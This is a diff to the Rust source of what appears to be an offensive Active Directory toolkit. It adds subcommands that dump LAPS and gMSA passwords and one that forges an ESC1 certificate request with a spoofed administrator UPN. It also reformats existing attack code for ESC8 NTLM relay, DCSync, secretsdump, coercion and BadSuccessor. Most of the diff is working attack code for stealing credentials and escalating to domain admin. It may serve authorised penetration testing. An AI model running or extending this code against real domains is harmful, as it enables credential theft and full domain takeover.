@@ -51,8 +51,86 @@ enum Command {
     /// Active attacks: roast/spray/abuse/coerce/relay/RBCD/DCSync/exec/WMI/LAPS/ESC1-4/golden/silver/PtT/BadSuccessor/DCShadow.
     #[command(subcommand)]
     Attack(AttackCmd),
+    /// Offline / single-purpose check runners — subset of `scan` for one taxonomy at a time.
+    #[command(subcommand)]
+    Check(CheckCmd),
+    /// Dump credentials / secrets from AD (LAPS, gMSA).
+    #[command(subcommand)]
+    Dump(DumpCmd),
     /// Guided: scan → correlate → confirm each weakness → validate + PoC → report.
     Auto(AutoArgs),
+}
+
+#[derive(Subcommand)]
+enum CheckCmd {
+    /// Run the ms-crtd ESC1-15 rule pack over pKICertificateTemplate objects
+    /// collected from LDAP. Complements `scan` — no ACL walk, just the
+    /// template-shape checks straight out of `ms-crtd::detect_esc`.
+    Adcs(CheckAdcsArgs),
+}
+
+#[derive(Parser)]
+struct CheckAdcsArgs {
+    /// LDAP URL, e.g. ldaps://dc.corp.local:636
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
+    /// Emit findings as JSON (default: human-readable).
+    #[arg(long)]
+    json: bool,
+}
+
+#[derive(Subcommand)]
+enum DumpCmd {
+    /// Dump LAPS local-admin passwords. Wire path over the `ms-gkdi` seed-key
+    /// derivation is TODO — this subcommand today reuses the existing
+    /// `attack laps` code path over dpapi-ng and prints a hint for the
+    /// ms-gkdi-only route.
+    Laps(DumpLapsArgs),
+    /// Dump gMSA `msDS-ManagedPassword` blobs. TODO wire onto ms-gkdi for the
+    /// LAPS-v2 style seed-key derivation; for now falls back to `attack gmsa`
+    /// (which speaks the SEALED LDAP path directly).
+    Gmsa(DumpGmsaArgs),
+}
+
+#[derive(Parser)]
+struct DumpLapsArgs {
+    /// Target sAMAccountName, e.g. `WIN11$`. Omit to dump every readable entry.
+    #[arg(long)]
+    target: Option<String>,
+    /// LDAP URL (LDAPS required for the sealed channel that returns the blob).
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
+    /// DC host / KDC for the GKDI GetKey call (defaults to the URL host).
+    #[arg(long)]
+    dc: Option<String>,
+}
+
+#[derive(Parser)]
+struct DumpGmsaArgs {
+    /// gMSA sAMAccountName (e.g. `gmsa_web$`).
+    #[arg(long)]
+    target: String,
+    /// LDAP URL (LDAPS required).
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
 }
 
 #[derive(Parser)]
@@ -255,6 +333,12 @@ enum AttackCmd {
     Winrm(WinrmArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
     Esc1(Esc1Args),
+    /// Certipy-style ESC1 request via `ms-icpr`: build a CSR with an
+    /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
+    /// Sealed `\PIPE\cert` transport is not wired in this build — the command
+    /// runs offline preflight + emits the marshaled bytes so the wire can be
+    /// verified before a live submission.
+    Certipy(CertipyArgs),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
     Golden(GoldenArgs),
     /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
@@ -378,6 +462,38 @@ struct GoldenArgs {
     /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
     #[arg(long)]
     verify_spn: Option<String>,
+}
+
+#[derive(Parser)]
+struct CertipyArgs {
+    /// CA name (e.g. `corp-CA`) — target `pKIEnrollmentService.cn`.
+    #[arg(long)]
+    ca: String,
+    /// Certificate template `cn` that permits enrollee-supplied subject/SAN.
+    #[arg(long)]
+    template: String,
+    /// UPN to inject into the SAN (e.g. `administrator@corp.local`).
+    #[arg(long = "target-upn")]
+    target_upn: String,
+    /// Subject CN for the CSR (default: `Recon`).
+    #[arg(long, default_value = "Recon")]
+    subject: String,
+    /// PEM-encoded RSA private key path to sign the CSR with. If absent, a
+    /// fresh 2048-bit key is generated and written alongside the CSR.
+    #[arg(long)]
+    key: Option<String>,
+    /// Write the marshaled `CertServerRequest` stub bytes here (base64 skipped
+    /// — raw DCE/RPC input stub for offline diffing / relay).
+    #[arg(long, default_value = "certipy.stub")]
+    out: String,
+    /// Write the CSR DER here.
+    #[arg(long, default_value = "certipy.csr")]
+    csr_out: String,
+    /// Enrollment-agent schema-version override. ms-icpr's preflight rejects
+    /// templates with `min_ra_signatures > 0`; this flag forces a synthetic
+    /// override for lab-only testing when the LDAP fetch is unavailable.
+    #[arg(long)]
+    schema_version: Option<i32>,
 }
 
 #[derive(Parser)]
@@ -900,6 +1016,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
         Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
         Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
+        Command::Attack(AttackCmd::Certipy(a)) => certipy(a).await,
         Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
         Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
         Command::Attack(AttackCmd::Pth(a)) => pth(a).await,
@@ -908,6 +1025,9 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Esc4(a)) => esc4(a).await,
         Command::Attack(AttackCmd::Shadowcred(a)) => shadowcred(a).await,
         Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
+        Command::Check(CheckCmd::Adcs(a)) => check_adcs(a).await,
+        Command::Dump(DumpCmd::Laps(a)) => dump_laps(a).await,
+        Command::Dump(DumpCmd::Gmsa(a)) => dump_gmsa(a).await,
         Command::Auto(a) => {
             guided::guided(guided::GuidedArgs {
                 url: a.url,
@@ -1037,8 +1157,8 @@ async fn sessions(a: SessionsArgs) -> Result<()> {
 /// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
 /// (which now reassembles multi-fragment replies, so large/computer accounts work too).
 async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
-    use ms_drsr::DrsSession;
     use dcerpc::samr::SamrClient;
+    use ms_drsr::DrsSession;
     use smb2_client::SmbClient;
 
     // 1. enumerate accounts via SAMR-over-SMB.
@@ -1324,8 +1444,7 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
                 // roundtrips (2 opens + 2 closes) versus opening HKLM inside each helper.
                 match r.hklm().await {
                     Ok(hklm) => {
-                        let bk_res =
-                            adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
+                        let bk_res = adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
                         let bk_opt = match bk_res {
                             Ok(bk) => {
                                 eprintln!(
@@ -1477,7 +1596,9 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
                 print_lsa_secret(&s.name, &s.secret);
             }
         }
-        eprintln!("[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive.");
+        eprintln!(
+            "[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive."
+        );
         return Ok(());
     }
     let Some(security) = security.as_ref() else {
@@ -1881,8 +2002,8 @@ async fn decrypt_encrypted_laps(
     )
     .await
     .map_err(|e| anyhow::anyhow!("GKDI GetKey: {e}"))?;
-    let plaintext_utf16 = decrypt(&protected, &envelope)
-        .map_err(|e| anyhow::anyhow!("DPAPI-NG decrypt: {e:?}"))?;
+    let plaintext_utf16 =
+        decrypt(&protected, &envelope).map_err(|e| anyhow::anyhow!("DPAPI-NG decrypt: {e:?}"))?;
     // Windows LAPS stores `{"n":"<account>","t":"<hex>","p":"<pw>"}` as UTF-16LE.
     let pw = laps_password_from_json(&plaintext_utf16)
         .ok_or_else(|| anyhow::anyhow!("decrypted blob has no 'p' field"))?;
@@ -1956,7 +2077,10 @@ async fn laps(a: LapsArgs) -> Result<()> {
         // Encrypted-LAPS path: msLAPS-EncryptedPassword → LAPS header → CMS ProtectedBlob →
         // MS-GKDI GetKey for the blob's KeyIdentifier → derive L2 key → open the blob.
         let Some(bytes) = &e.encrypted_blob else {
-            eprintln!("[!] {}: no cleartext and no encrypted blob to work with", e.sam);
+            eprintln!(
+                "[!] {}: no cleartext and no encrypted blob to work with",
+                e.sam
+            );
             continue;
         };
         match decrypt_encrypted_laps(&dc_host, &domain, &user, &a.password, bytes).await {
@@ -2167,8 +2291,7 @@ async fn coerce(a: CoerceArgs) -> Result<()> {
     use dcerpc::efsr::CoerceClient;
     let pipe = smb.open_pipe(&a.pipe).await?;
     let mut client =
-        CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-            .await?;
+        CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host).await?;
     match client.coerce(&a.listener).await {
         Ok(status) => {
             println!(
@@ -2508,7 +2631,9 @@ async fn relay(a: RelayArgs) -> Result<()> {
         "ldap-keycred" => (RelayTarget::LdapKeycred, None),
         "ldap-rbcd" => {
             let sid = a.trustee_sid.clone().ok_or_else(|| {
-                anyhow::anyhow!("--target ldap-rbcd requires --trustee-sid <SID of a controlled account>")
+                anyhow::anyhow!(
+                    "--target ldap-rbcd requires --trustee-sid <SID of a controlled account>"
+                )
             })?;
             (RelayTarget::LdapRbcd, Some(sid))
         }
@@ -2527,9 +2652,9 @@ async fn relay(a: RelayArgs) -> Result<()> {
             })?;
             (RelayTarget::Icpr(ca, a.ca_template.clone()), None)
         }
-        other => anyhow::bail!(
-            "unknown --target {other} (ldap-keycred | ldap-rbcd | adcs-http | icpr)"
-        ),
+        other => {
+            anyhow::bail!("unknown --target {other} (ldap-keycred | ldap-rbcd | adcs-http | icpr)")
+        }
     };
 
     let base: String = a
@@ -2587,8 +2712,17 @@ async fn relay_one(
 
     // ESC8 relay: HTTP not LDAP, so branch off before opening the LDAP client.
     if let RelayTarget::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
-        return relay_esc8(rc, type1, peer, target_object, ca_host, port, template, insecure)
-            .await;
+        return relay_esc8(
+            rc,
+            type1,
+            peer,
+            target_object,
+            ca_host,
+            port,
+            template,
+            insecure,
+        )
+        .await;
     }
     // ESC11 relay: ncacn_ip_tcp to MS-ICPR — NTLM auth handshake, then unsealed CertServerRequest.
     if let RelayTarget::Icpr(ref ca_host, ref template) = target {
@@ -2652,7 +2786,10 @@ async fn relay_esc8(
     template: &str,
     insecure: bool,
 ) -> Result<()> {
-    use adcs_relay::{base64_decode, base64_encode, cert_request_form, parse_ntlm_challenge, parse_request_id, HttpsClient};
+    use adcs_relay::{
+        base64_decode, base64_encode, cert_request_form, parse_ntlm_challenge, parse_request_id,
+        HttpsClient,
+    };
 
     println!(
         "[+] victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
@@ -2674,7 +2811,9 @@ async fn relay_esc8(
         ("Content-Type", "application/x-www-form-urlencoded"),
         ("User-Agent", "adhammer-esc8/1"),
     ];
-    let r1 = http.send("POST", "/certsrv/certfnsh.asp", headers1, b"").await?;
+    let r1 = http
+        .send("POST", "/certsrv/certfnsh.asp", headers1, b"")
+        .await?;
     if r1.status != 401 {
         anyhow::bail!(
             "CA expected 401 with WWW-Authenticate NTLM Type-2, got {} (server may reject relayed auth)",
@@ -2708,15 +2847,16 @@ async fn relay_esc8(
         );
     }
     let html = String::from_utf8_lossy(&r2.body);
-    let req_id =
-        parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
+    let req_id = parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
     println!("[+] CA accepted submission — Request ID {req_id}, fetching certificate…");
 
     // Round 3: GET the issued cert. This may reuse the same connection or open a new one;
     // AD CS is happy with either — send unauthenticated (session already established), and if
     // the CA insists, replaying Type-3 here works because it was on the same stream.
     let path = format!("/certsrv/certnew.cer?ReqID={req_id}&Enc=b64");
-    let r3 = http.send("GET", &path, &[("User-Agent", "adhammer-esc8/1")], b"").await?;
+    let r3 = http
+        .send("GET", &path, &[("User-Agent", "adhammer-esc8/1")], b"")
+        .await?;
     if r3.status != 200 {
         anyhow::bail!("certnew.cer returned HTTP {} for ReqID {req_id}", r3.status);
     }
@@ -4225,7 +4365,11 @@ async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
     // Derive DNS domain from base DN: "DC=testlab,DC=local" -> "testlab.local".
     let dns_domain: String = base
         .split(',')
-        .filter_map(|p| p.trim().strip_prefix("DC=").or_else(|| p.trim().strip_prefix("dc=")))
+        .filter_map(|p| {
+            p.trim()
+                .strip_prefix("DC=")
+                .or_else(|| p.trim().strip_prefix("dc="))
+        })
         .collect::<Vec<_>>()
         .join(".");
     let dns_host = format!("{name}.{dns_domain}");
@@ -4259,8 +4403,14 @@ async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
     ];
     c.add_object(&dn, attrs).await?;
     println!("[+] created dMSA {dn}");
-    println!("    → succeeds {} (PAC of the victim is issued to {sam})", a.target);
-    println!("    Next: request a TGT as {sam} and use it as if it were {}", a.target);
+    println!(
+        "    → succeeds {} (PAC of the victim is issued to {sam})",
+        a.target
+    );
+    println!(
+        "    Next: request a TGT as {sam} and use it as if it were {}",
+        a.target
+    );
     Ok(())
 }
 
@@ -4311,11 +4461,16 @@ async fn esc4(a: Esc4Args) -> Result<()> {
     );
 
     if let Some(enrollee) = &a.enrollee {
-        eprintln!("[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
+        eprintln!(
+            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
                    yet — flags alone often suffice if the template is already broadly enrollable. \
-                   Set the ACE manually or via `attack abuse` if needed.");
+                   Set the ACE manually or via `attack abuse` if needed."
+        );
     }
-    println!("    → attack esc1 --template {} --alt-name Administrator", a.template);
+    println!(
+        "    → attack esc1 --template {} --alt-name Administrator",
+        a.template
+    );
     Ok(())
 }
 
@@ -4372,7 +4527,11 @@ async fn dcshadow(a: ScanArgs) -> Result<()> {
     let snap = Collector::connect(&config(&a)).await?.collect().await?;
     let graph = adhammer_graph::ControlGraph::build(&snap);
     let mut who = Vec::new();
-    for kind in [P::DcsyncGetChanges, P::DcsyncGetChangesAll, P::DcsyncGetChangesFiltered] {
+    for kind in [
+        P::DcsyncGetChanges,
+        P::DcsyncGetChangesAll,
+        P::DcsyncGetChangesFiltered,
+    ] {
         for (src, dst) in graph.direct_edges_to_tier0(kind.into()) {
             who.push((src, dst, kind));
         }
@@ -4389,10 +4548,163 @@ async fn dcshadow(a: ScanArgs) -> Result<()> {
         println!(
             "These already have DCSync. Each is a shortcut to DA — running `attack dcsync --user krbtgt`"
         );
-        println!(
-            "as any of them dumps the whole domain without a lateral move."
-        );
+        println!("as any of them dumps the whole domain without a lateral move.");
     }
+    Ok(())
+}
+
+/// `check adcs` — pull every `pKICertificateTemplate` from the domain, run the
+/// `ms-crtd` ESC1-15 rule pack over the typed view, and emit adhammer `Finding`s.
+/// Offline pass — no ACL walk, no CA registry probe, no active enrollment; the
+/// exhaustive ESC pipeline is `adhammer scan` (which fires the parallel
+/// `A-AdcsEsc` rule alongside the graph-based paths).
+async fn check_adcs(a: CheckAdcsArgs) -> Result<()> {
+    let cfg = LdapConfig {
+        url: a.url.clone(),
+        bind_dn: a.user.clone(),
+        password: a.password.clone(),
+        base_dn: None,
+        insecure: a.insecure,
+        gssapi: false,
+    };
+    let snap = Collector::connect(&cfg).await?.collect().await?;
+    let templates =
+        adhammer_collector::sources::adcs::templates_from(snap.objects.iter().collect::<Vec<_>>());
+    let findings = adhammer_checks::rules::esc::detect_all(&templates);
+    if a.json {
+        let j = serde_json::to_string_pretty(&findings)?;
+        println!("{j}");
+    } else {
+        println!(
+            "== check adcs (ms-crtd ESC rule pack) — {} template(s) scanned, {} finding(s) ==",
+            templates.len(),
+            findings.len()
+        );
+        for f in &findings {
+            println!(
+                "[{:?}] {} — {}\n  affected: {}\n  {}\n",
+                f.severity,
+                f.id,
+                f.title,
+                f.affected.join(", "),
+                f.detail
+            );
+        }
+    }
+    Ok(())
+}
+
+/// `dump laps` — read LAPS local-admin passwords. The `ms-gkdi`-first wire path
+/// (parse `msLAPS-EncryptedPassword` header via `sources::gkdi::parse_key_identifier`,
+/// fetch the GKDI envelope, derive the L2 key locally) is not yet plumbed end-to-end
+/// through the `ISDKey` sealed RPC in adhammer's transport; today this command
+/// prints a hint and defers to the mature `attack laps` code path.
+async fn dump_laps(a: DumpLapsArgs) -> Result<()> {
+    eprintln!(
+        "[i] dump laps: ms-gkdi wire path (parse-header → derive-L2 offline) is available in \
+         `adhammer_collector::sources::gkdi`, but the sealed ISDKey RPC caller in this build \
+         still ships through `attack laps` (dpapi-ng). Running that path now."
+    );
+    let _ = a.dc; // reserved for the ms-gkdi path
+    laps(LapsArgs {
+        target: a.target,
+        url: a.url,
+        user: a.user,
+        password: a.password,
+        insecure: a.insecure,
+    })
+    .await
+}
+
+/// `dump gmsa` — read a gMSA's `msDS-ManagedPassword` blob. Same status as
+/// `dump laps`: the seed-key derivation lives in `sources::gkdi`, but the
+/// LDAP-attribute-fetch path already handles gMSA end-to-end via
+/// `attack gmsa` (`msDS-ManagedPassword` over a sealed LDAP channel).
+async fn dump_gmsa(a: DumpGmsaArgs) -> Result<()> {
+    eprintln!(
+        "[i] dump gmsa: `msDS-ManagedPassword` is delivered as an MSDS-MANAGEDPASSWORD_BLOB \
+         over sealed LDAP (no GKDI RPC needed for the current-password read). Forwarding to \
+         `attack gmsa`."
+    );
+    gmsa(GmsaArgs {
+        url: a.url,
+        user: a.user,
+        password: a.password,
+        insecure: a.insecure,
+        target: a.target,
+    })
+    .await
+}
+
+/// `attack certipy` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
+/// SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
+/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be
+/// verified before a live submission. The sealed `\PIPE\cert` transport requires
+/// `ms-icpr`'s `network` feature — disabled in this build to keep the workspace
+/// off the `dcerpc↔ms-nrpc` resolver cycle — and stays a TODO here.
+async fn certipy(a: CertipyArgs) -> Result<()> {
+    use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
+    use ms_crtd::model::CertTemplate;
+    use ms_crtd::oid::Oid;
+
+    let key_pem = if let Some(path) = &a.key {
+        std::fs::read(path).with_context(|| format!("read --key {path}"))?
+    } else {
+        use rsa::pkcs8::EncodePrivateKey;
+        use rsa::RsaPrivateKey;
+        let mut rng = rand::thread_rng();
+        let key = RsaPrivateKey::new(&mut rng, 2048).context("generate RSA-2048 for CSR")?;
+        let pem = key
+            .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
+            .context("encode key PKCS#8 PEM")?;
+        let pem_bytes = pem.as_bytes().to_vec();
+        let key_path = format!("{}.key.pem", a.csr_out);
+        std::fs::write(&key_path, &pem_bytes)?;
+        eprintln!("[+] generated 2048-bit RSA key → {key_path}");
+        pem_bytes
+    };
+
+    let csr = ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
+        .context("build_csr_with_upn_san")?;
+    std::fs::write(&a.csr_out, &csr)?;
+    eprintln!(
+        "[+] CSR built (subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
+        a.subject,
+        a.target_upn,
+        a.csr_out,
+        csr.len()
+    );
+
+    // Synthesize a minimal `CertTemplate` — with no LDAP fetch here, this stand-in
+    // exists purely to make `IcprClient::marshal_call` preflight pass so the stub
+    // bytes can be materialised. Live submissions run through `attack esc1` today.
+    let template = CertTemplate {
+        name: a.template.clone(),
+        oid: Oid::new("1.3.6.1.4.1.311.21.8.1.42"),
+        schema_version: a.schema_version.unwrap_or(2),
+        enrollment_flag: EnrollmentFlag::empty(),
+        name_flag: NameFlag::ENROLLEE_SUPPLIES_SUBJECT,
+        private_key_flag: PrivateKeyFlag::empty(),
+        ekus: vec![Oid::new("1.3.6.1.5.5.7.3.2")],
+        min_ra_signatures: 0,
+        raw_security_descriptor: None,
+    };
+    let client = ms_icpr::IcprClient::stub(a.ca.clone());
+    let stub = client
+        .marshal_call(&template, &csr)
+        .context("ms_icpr::IcprClient::marshal_call")?;
+    std::fs::write(&a.out, &stub)?;
+    eprintln!(
+        "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
+        a.out,
+        stub.len(),
+        ms_icpr::CERT_SERVER_REQUEST_OPNUM
+    );
+    eprintln!(
+        "[i] live submission over sealed \\PIPE\\cert requires ms-icpr's `network` feature — \
+         disabled in this build. Feed the stub into `attack esc1` or a fuzz/relay harness for \
+         wire replay."
+    );
     Ok(())
 }
 
